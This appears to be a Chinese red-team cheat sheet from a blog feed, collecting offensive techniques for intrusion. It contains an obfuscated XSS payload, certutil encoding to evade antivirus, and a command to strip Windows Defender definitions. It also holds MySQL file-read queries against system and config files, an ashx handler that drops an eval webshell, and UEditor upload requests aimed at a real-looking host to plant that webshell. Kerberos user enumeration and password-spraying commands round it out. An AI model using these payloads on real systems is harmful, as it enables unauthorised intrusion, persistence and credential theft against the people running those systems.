<pre><code>&lt;%00EEEE&lt;svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\&gt;svg&gt;%0APayloadCopy
</code></pre>
<hr>
<p>通过certutil进行编码解码文件bypass杀软</p>
<pre><code># 编码Certutil -encode d:\artifact.exe d:\artifact.txt# 写入echo sfAFASFAsfasgasdf………&gt;&gt;d:\1.txt# 解码Certutil -decode d:\art.txt d:\art.exeCopy
</code></pre>
<hr>
<p>关闭defender</p>
<pre><code>C:\PROGRA~1\WINDOW~1&gt;MpCmdRun.exe -RemoveDefinitions -allMpCmdRun.exe -RemoveDefinitions -allService Version: 4.18.1812.3Engine Version: 1.1.17600.5AntiSpyware Signature Version: 1.327.2026.0AntiVirus Signature Version: 1.327.2026.0NRI Engine Version: 1.1.17600.5NRI Signature Version: 1.327.2026.0Starting engine and signature rollback to none...Done!Copy
</code></pre>
<hr>
<p>站库分离操作内容</p>
<ul>
<li>mysql</li>
</ul>
<pre><code>  select @@hostname;                                 //服务端主机名称select * from information_schema.PROCESSLIST;      //客户端主机名称和端口select load_file('C:/Windows/System32/drivers/etc/hosts');   //读取文件/etc/hosts/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf/etc/udev/rules.d/70-persistent-net.rules          //获取网卡名称/etc/network/interfaces                            //DHCP或静态IP/var/lib/dhclient/dhclient--网卡.lease             //DHCP/etc/sysconfig/network-scripts/ifcfg-网卡          //静态IPC:/Windows/System32/drivers/etc/hostsC:/Windows/system32/inetsrv/MetaBase.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/phpStudy/Apache/conf/httpd.confC:/phpStudy/Apache/conf/vhosts.confC:/phpStudy/PHPTutorial/Apache/conf/httpd.confC:/phpStudy/PHPTutorial/Apache/conf/vhosts.confC:/phpStudy/PHPTutorial/nginx/conf/nginx.confC:/phpStudy/PHPTutorial/nginx/conf/vhosts.confCopy
</code></pre>
<ul>
<li>
<p>mssql</p>
<pre><code>select host_name();                       //客户端主机名称select @@servername;                      //服务端主机名称select serverproperty('MachineName');     //服务端主机名称select name from master.sys.sysdatabases;    //查看连接到数据库的机器名select * from master.sys.sysprocesses where dbid= db_id('sqlinject');Copy
</code></pre>
</li>
<li>
<p>模拟令牌</p>
<pre><code>只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌。# msfmeterpreter &gt; use IncognitoCopy
</code></pre>
</li>
</ul>
<hr>
<p>ashx webshell</p>
<ul>
<li>会自己生成一个aspx webshell</li>
</ul>
<pre><code>&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; using System; using System.Web; using System.IO; public class Handler : IHttpHandler {     public void ProcessRequest (HttpContext context) {         context.Response.ContentType = &quot;text/plain&quot;;         string show=&quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;;         StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;));         file1.Write(show);         file1.Flush();         file1.Close();     }     public bool IsReusable {         get {             return false;         }     } }Copy
</code></pre>
<hr>
<p>ssh 反向端口转发</p>
<pre><code>ssh -R 0.0.0.0:rport:localhost:lport root@x.x.x.xCopy
</code></pre>
<hr>
<p>禁用theme主题</p>
<pre><code>&lt;%@ Page Language=&quot;Jscript&quot; EnableTheming = &quot;False&quot; StylesheetTheme=&quot;&quot; Theme=&quot;&quot; %&gt;Copy
</code></pre>
<hr>
<p>ue不出网利用</p>
<ul>
<li>
<p>上传本地</p>
<pre><code>POST /ueditor/net/controller.ashx?action=uploadimage HTTP/1.1Host: pmp.csc.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------19350128512434Content-Length: 199-----------------------------19350128512434Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;delicious.png&quot;Content-Type: image/png123-----------------------------19350128512434--Copy
</code></pre>
</li>
<li>
<p>抓取本地图片写入webshell</p>
<pre><code>POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1Host: pmp.csc.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 99source%5B%5D=http://127.0.0.1/App_Upload/ueditor/image/20210116/6374641084286323059465749.png?.htmlCopy
</code></pre>
<ul>
<li>如果不成就换几个端口试试</li>
</ul>
</li>
</ul>
<hr>
<p>常见web系统弱口令</p>
<p><a href="http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p>
<hr>
<p>域外枚举以及爆破</p>
<p>https://github.com/3gstudent/pyKerbrute</p>
<ul>
<li>
<p>EnumADUser.py</p>
<pre><code>python2 EnumADUser.py 192.168.60.1 test.com user.txt tcp
Copy
</code></pre>
<figure data-type="image" tabindex="14"><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="Image" loading="lazy"></a></figure>
<p><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1">Image</a></p>
</li>
<li>
<p>ADPwdSpray.py</p>
<pre><code>python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt clearpassword QWE123!@# tcp
Copy
</code></pre>
<figure data-type="image" tabindex="15"><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="Image" loading="lazy"></a></figure>
<p><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1">Image</a></p>
<pre><code>python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt ntlmhash 35c83173a6fb6d142b0359381d5cc84c udp
Copy
</code></pre>
<figure data-type="image" tabindex="16"><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="Image" loading="lazy"></a></figure>
<p><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1">Image</a></p>
</li>
</ul>
]]></content>
    </entry>
</feed>